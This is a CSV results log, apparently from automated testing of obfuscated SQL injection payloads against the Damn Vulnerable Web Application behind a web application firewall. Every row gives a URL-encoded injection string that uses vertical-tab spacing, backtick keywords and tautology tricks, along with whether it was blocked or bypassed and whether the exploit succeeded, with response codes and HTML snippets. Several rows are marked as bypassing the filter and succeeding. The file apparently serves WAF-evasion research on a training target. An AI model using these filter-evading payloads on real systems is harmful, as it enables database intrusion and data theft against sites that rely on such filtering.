Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1.%0b||%0bnot%7efalse=%0b(!%0b{a%0b1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0368,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+!%0b1=+(not+{x%0b(select%0b1)}=1,Bypassed,No,None,Invalid,0.0154,72.23,No,500,
0%27<@!=.1+||+not%7efalse=%0b(!%0b{a%0b1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0204,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||%0bnot%0b1=+(not+{`if`%0b1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0461,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0bnot%0btrue=+(not+{a+1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0301,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+not+{x%0b(select%0b1)}=1=%0b(not+,Bypassed,No,None,Invalid,0.0345,72.23,No,500,
0'<@=1+or+not%0b{x+(select%0b1)}=1=%0b(not~false,Bypassed,No,None,Invalid,0.013,72.23,No,500,
0'<@=.1+or%0b!+{x+(select%0b1)}=1=+(!%0b{x,Blocked,No,None,Invalid,0.0486,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+!%0b{`if`%0b1}=1=%0b(!+{`if`%0b1}=1,Bypassed,No,None,Invalid,0.0361,72.23,No,500,
0'<@=.1+||%0b!+{a%0b1}=1=+(!%7efalse),Bypassed,No,None,Invalid,0.0445,72.23,No,500,
0%27<@=.1+or%0b!%0b{x%0b(select+1)}=1=%0b(!+{x,Bypassed,Yes,Yes (unionAtk),Invalid,0.0204,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||+not%0b{`if`%0b1}=1=+(not%0b{`if`%0b1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.02,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||+!+{a%0b1}=1=+(not%0b{x+(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0311,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||+not+1=+(!%0btrue)%0bor,Bypassed,Yes,Yes (unionAtk),Invalid,0.0229,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+!%0b{a+1}=1=+(not+{a+,Bypassed,No,None,Invalid,0.0429,72.23,No,500,
0'<@!=1.%0b||%0b{x%0b(select%0b1)}=1+like%0b1%0bor',Bypassed,No,None,Invalid,0.0369,72.23,No,500,
0%27<@!=1%0b||+!+{x+(select+1)}=1=+(not~false,Bypassed,Yes,Yes (unionAtk),Invalid,0.0226,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0bnot~false=%0b(not%7efalse)%0bor,Bypassed,No,None,Invalid,0.0474,72.23,No,500,
0'<@=1+or%0b!+{x+(select%0b1)}=1=+(!%0btrue,Blocked,No,None,Invalid,0.0155,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+!+1=%0b(not+{a+1}=1),Bypassed,No,None,Invalid,0.0122,72.23,No,500,
0%27<@!=1+or%0bnot%0b1=+(not%0btrue)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0301,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or%0b{x+(select+1)}=1%0blike+{x+(select%0b1)}=1%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0258,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{a%0b1}=1=%0b(!%0b{x%0b(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0661,72.28,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+not%0b{`if`+1}=1=%0b(not+{`if`+1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.04,72.33,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||%0b{`if`%0b1}=1+like+{a%0b1}=1%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0457,72.33,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27||+@<@.+||%0bnot+{x+(select+1)}=1=+(!,Blocked,No,None,Invalid,0.0178,72.33,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||+not+1=+(not+{`if`+1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0467,72.33,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||+!%0b1=+(not%0b{x+(select+1)}=1,Bypassed,No,None,Invalid,0.0466,72.33,No,500,
0'<@!=1.+||+!%7e0=+(0)+||',Blocked,No,None,Invalid,0.0183,72.33,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+||+not%0b{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Invalid,0.0252,72.33,No,500,
0'<@=1+or+not+{x+(select+1)}=1=+(not+{a,Blocked,No,None,Invalid,0.0232,72.33,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||%0b1%0blike%0b{x+(select+1)}=1--%0b,Blocked,No,None,Invalid,0.0271,72.33,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'||+!@<@.+or+!%0b{a%0b1}=1=+(not+,Bypassed,No,None,Invalid,0.0261,72.23,No,500,
0'<@=.1%0b||+!+{`if`+1}=1=%0b(not+{x+(select,Bypassed,No,None,Invalid,0.062,72.23,No,500,
0'<@=1.+or%0bnot+true=%0b(!~false)+or,Bypassed,No,None,Invalid,0.021,72.23,No,500,
0'<@=.1+||+!+{x+(select+1)}=1=+(!+,Blocked,No,None,Invalid,0.0346,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+||%0bnot%0b{x+(select%0b1)}=1=%0b(not+,Blocked,No,None,Invalid,0.0273,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+not+{a%0b1}=1=+(not+true),Blocked,No,None,Invalid,0.0349,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||%0b!+{x+(select+1)}=1=+(!+{a,Blocked,No,None,Invalid,0.0344,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0b||+not%0b{x%0b(select%0b1)}=1=+(not+{`if`,Bypassed,No,None,Invalid,0.0232,72.23,No,500,
0'<@!=1.%0bor+!%0b{`if`%0b1}=1=+(not~false),Bypassed,No,None,Invalid,0.0438,72.23,No,500,
0%27<@=1%0b||%0bnot+{x+(select+1)}=1=+(!%0b{a,Bypassed,Yes,Yes (unionAtk),Invalid,0.0531,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(!~,Bypassed,No,None,Invalid,0.0328,72.23,No,500,
0'<@!=1.%0bor+not+{x+(select%0b1)}=1=%0b(not~false,Bypassed,No,None,Invalid,0.0341,72.23,No,500,
0%27<@=1.+or+not%0b{a+1}=1=%0b(!+{x%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0401,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or%0b!+{`if`%0b1}=1=%0b(!+{x+(select,Bypassed,No,None,Invalid,0.0588,72.23,No,500,
0'<@=.1%0bor+not%0b{a+1}=1=%0b(!+{a+1}=1,Bypassed,No,None,Invalid,0.0187,72.23,No,500,
0%27<@=.1+or%0b!%0b{a%0b1}=1=+(!%0b{x+(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0165,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0b!+{`if`%0b1}=1=%0b(!+{a+1}=1,Bypassed,No,None,Invalid,0.0435,72.23,No,500,
0'<@!=1.%0bor%0bnot+{x+(select+1)}=1=+(not%0b{x,Bypassed,No,None,Invalid,0.0256,72.23,No,500,
0'<@!=1%0bor%0bnot%0b{a+1}=1=+(not%0b{x%0b(select,Bypassed,No,None,Invalid,0.0179,72.23,No,500,
0'<@=.1%0bor%0bnot+{`if`+1}=1=+(not+{x%0b(select,Bypassed,No,None,Invalid,0.0362,72.23,No,500,
0'<@=.1%0bor%0bnot%0b{x+(select%0b1)}=1=+(!%0b{`if`,Bypassed,No,None,Invalid,0.0376,72.23,No,500,
0'<@=1.+||+{x+(select+1)}=1+like%0btrue+or',Blocked,No,None,Invalid,0.0258,72.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0b||+!%7efalse=%0b(!+{x+(select+1)}=1,Bypassed,No,None,Invalid,0.0188,72.23,No,500,
0%27<@!=.1+||+!+{`if`+1}=1=%0b(not+{x%0b(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0364,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0bnot+{a%0b1}=1=%0b(not+{x+,Bypassed,No,None,Invalid,0.0249,72.23,No,500,
0%27<@!=.1+||%0b!+{x%0b(select+1)}=1=+(!+{x,Bypassed,Yes,Yes (unionAtk),Invalid,0.0293,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||+!+{x+(select%0b1)}=1=+(not%0b{`if`,Bypassed,Yes,Yes (unionAtk),Invalid,0.0672,72.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
